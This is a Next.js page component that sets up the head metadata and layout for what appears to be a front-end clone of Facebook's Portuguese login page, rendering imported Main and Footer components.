import { Footer } from '@/components/Footer'
import { Main } from '@/components/Main'
import Head from 'next/head'
import Image from 'next/image'


export default function Home() {
  return (
    <>
      <Head>
        <title>Facebook - entre ou cadastre-se</title>
        <link rel="preconnect" href="https://fonts.googleapis.com"/>
        <link rel="preconnect" href="https://fonts.gstatic.com"/>
        <meta name="description" content="Entre no Facebook para começar a compartilhar e se conectar com seus amigos, 
        familiares e com as pessoas que você conhece." />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
        <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700;900&display=swap" rel="stylesheet"/>
      </Head>
      <main className='min-h-screen w-full grid place-items-center bg-main-gray'>
        <Main />
      </main>
      <footer>
        <Footer />
      </footer>
    </>
  )
}
